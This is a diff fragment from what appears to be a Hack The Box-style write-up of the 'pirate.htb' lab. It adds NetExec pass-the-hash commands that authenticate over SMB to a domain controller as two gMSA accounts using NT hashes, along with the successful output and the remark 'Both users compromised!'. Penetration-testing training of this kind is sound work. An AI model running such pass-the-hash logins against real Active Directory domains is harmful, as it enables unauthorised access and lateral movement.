@@ -224,8 +224,18 @@ LDAP        dc01.pirate.htb 389    DC01             Account: gMSA_ADFS_prod$    
 I have both NT hashes for both of these accounts
 
 ```python
+nxc smb dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'e819498ec29f595382df1eaf4fb42307'
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307
 
+nxc smb dc01.pirate.htb -u 'gMSA_ADCS_prod$' -H 'aa831d274ee80cf2092f68cbcf29093e'
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [+] pirate.htb\gMSA_ADCS_prod$:aa831d274ee80cf2092f68cbcf29093e
 ```
+
+Both users compromised!
+
+
 
 
 
